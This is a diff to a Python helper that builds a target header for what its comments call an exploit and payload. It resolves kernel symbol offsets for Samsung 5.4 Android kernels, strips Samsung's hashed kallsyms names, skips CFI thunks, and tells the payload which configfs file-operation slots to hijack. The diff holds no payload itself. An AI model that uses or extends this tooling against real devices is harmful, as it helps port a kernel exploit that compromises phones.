@@ -921,6 +921,12 @@ SYMBOL_OFFSET_MACROS: dict[str, str] = {
 # the upstream per-kernel convention (generic on 6.1, copy on 6.6+).
 SYMBOL_ALIASES: dict[str, tuple[str, ...]] = {
     "COPY_SPLICE_READ_OFF": ("copy_splice_read", "filemap_splice_read"),
+    # pre-5.9 kernels (Samsung 5.4) name the configfs fops handlers
+    # configfs_read_file/configfs_write_file and dispatch through the classic
+    # read/write slots; the iter-based names only exist on 5.15+. The bin
+    # variants match the exploit's binary-attribute fake buffer.
+    "CONFIGFS_READ_ITER_OFF": ("configfs_read_bin_file", "configfs_read_file"),
+    "CONFIGFS_BIN_WRITE_ITER_OFF": ("configfs_write_bin_file", "configfs_write_file"),
 }
 
 # legacy headers name the slide macros differently; when a template already
@@ -1316,6 +1322,7 @@ def cmd_gen_target_h(args: argparse.Namespace) -> int:
     else:
         report.append("- [WARN] no vmlinux nm dump supplied; symbol offsets are NOT derived")
     if base is not None and nm:
+        configfs_iter_api = 1
         for macro, symbol in SYMBOL_OFFSET_MACROS.items():
             resolved = resolve_symbol(nm, macro, symbol)
             if resolved is None:
@@ -1324,6 +1331,24 @@ def cmd_gen_target_h(args: argparse.Namespace) -> int:
             found_symbol, addr = resolved
             offset = addr - base
             set_derived(macro, offset, f"nm {found_symbol} - base")
+            if macro == "CONFIGFS_READ_ITER_OFF" and found_symbol != "configfs_read_iter":
+                # classic file-based configfs fops: payload must install the
+                # handlers in the read/write slots instead of read_iter/write_iter
+                configfs_iter_api = 0
+        # tell the payload which file_operations slots the configfs handlers
+        # live in: 1 = read_iter/write_iter (5.15+), 0 = read/write (5.4).
+        # Only emitted for pre-iter kernels so re-deriving an existing 5.10+
+        # header keeps it byte-identical (the payload defaults to iter slots).
+        if re.search(r"(?m)^\s*#define\s+CONFIGFS_ITER_API\b", text):
+            text = re.sub(
+                r"(?m)^\s*#define\s+CONFIGFS_ITER_API\s+\d+.*",
+                f"#define CONFIGFS_ITER_API {configfs_iter_api}",
+                text,
+            )
+            derived(f"CONFIGFS_ITER_API = {configfs_iter_api}")
+        elif configfs_iter_api == 0:
+            text = set_define(text, "CONFIGFS_ITER_API", 0)
+            derived("CONFIGFS_ITER_API = 0 (classic configfs read/write fops)")
         for macro, (symbol, struct_name, member) in COMPOSITE_SYMBOL_MACROS.items():
             addr = nm.get(symbol)
             member_off = struct_member_offset(args.struct_offsets, struct_name, member)
@@ -2136,7 +2161,17 @@ def parse_nm(path: Path) -> dict[str, int]:
     for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
         parts = line.split()
         if len(parts) >= 3 and re.fullmatch(r"[0-9a-fA-F]+", parts[0]):
-            symbols[parts[-1]] = int(parts[0], 16)
+            name = parts[-1]
+            # Samsung mangles kallsyms names with a $<32-hex> hash suffix
+            # (e.g. worker_thread$f31e2447a3fdcb60f4b193f95acd647c). .cfi_jt
+            # entries are CFI jump-table thunks, not the real functions. The
+            # nm dump is address-sorted, so keeping the first occurrence of
+            # each de-mangled name yields the real function address.
+            if ".cfi_jt" in name:
+                continue
+            name = re.sub(r"\$[0-9a-f]{32}$", "", name)
+            if name not in symbols:
+                symbols[name] = int(parts[0], 16)
     return symbols
 
 
